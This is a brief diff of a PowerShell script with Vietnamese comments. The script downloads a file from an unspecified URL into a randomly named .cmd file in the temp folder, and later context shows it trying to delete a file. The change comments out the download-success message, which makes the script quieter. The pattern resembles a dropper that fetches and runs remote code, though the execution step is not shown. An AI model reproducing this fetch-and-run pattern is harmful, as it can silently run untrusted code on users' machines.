@@ -13,7 +13,7 @@ $tempPath = Join-Path $env:TEMP "x_$rand.cmd"
 # Tải file
 try {
     Invoke-WebRequest -Uri $url -OutFile $tempPath -ErrorAction Stop
-    Write-Host "Tai file thanh cong: $tempPath"
+#    Write-Host "Tai file thanh cong: $tempPath"
 } catch {
     Write-Error "Khong the tai file từ $url"
     return
@@ -43,4 +43,5 @@ try {
 } catch {
     Write-Warning "Khong the xoa file: $($_.Exception.Message)"
 }
+
 
